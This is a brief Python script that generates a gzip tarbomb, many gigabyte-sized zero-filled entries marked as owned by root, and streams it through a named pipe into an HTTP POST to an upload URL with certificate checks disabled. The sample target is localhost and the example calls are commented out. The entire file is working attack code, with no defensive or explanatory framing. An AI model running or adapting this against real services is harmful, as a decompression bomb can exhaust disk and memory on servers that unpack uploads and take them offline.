#!/usr/bin/python3

import os
import io
import requests
import tarfile
import tempfile


class TarInfo(tarfile.TarInfo):

    def __init__(self, path, size):
        super(TarInfo, self).__init__(path)
        self.name = path
        self.size = size
        self.uid = 0
        self.gid = 0
        self.uname = 'root'
        self.gname = 'wheel'


def streamed_upload(url: str, path: str, size: int, num_file: int):
    tmp = tempfile.mkdtemp()

    filename = os.path.join(tmp, 'fifo')

    os.mkfifo(filename)

    pid = os.fork()
    if pid:
        try:
            requests.post(url,
                          data=read_tarbomb(filename),
                          headers={'Content-Type': 'application/octet-stream'},
                          verify=False)
        except requests.HTTPError:
            pass
    else:
        build_tarbomb(filename, path, size, num_file)

        os.unlink(filename)
        os.rmdir(tmp)


def build_tarbomb(filename: str, path: str, size: int, num_file: int):
    payload = io.BytesIO(b'\0' * size)

    with tarfile.open(filename, 'w|gz') as fp:
        for i in range(num_file):
            info = TarInfo(os.path.join(path, str(i)), size)

            payload.seek(0)
            fp.addfile(info, payload)


def read_tarbomb(filename: str, chunk_size=1024):
    with open(filename, 'rb') as fp:
        while True:
            data = fp.read(chunk_size)
            if not data:
                break
            yield data


KB = 1024
GB = KB ** 3

# build_tarbomb('tarbomb.tar.gz', '/tmp/OUT', GB, 2)

url_ = 'http://localhost/'
# streamed_upload(url_, '/tmp', GB, 2)
